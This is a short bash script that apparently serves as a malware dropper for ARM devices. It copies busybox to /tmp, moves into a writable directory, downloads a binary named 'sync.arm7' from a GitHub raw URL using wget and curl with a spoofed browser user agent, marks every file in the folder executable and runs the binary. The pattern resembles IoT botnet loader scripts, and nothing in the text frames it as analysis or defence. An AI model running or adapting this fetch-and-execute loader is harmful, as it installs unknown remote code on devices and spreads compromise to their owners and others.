#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm7; curl -L -o sync.arm7 -H "User-Agent: Mozilla/5.0" https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm7; cat sync.arm7 >sync; chmod +x *; ./sync
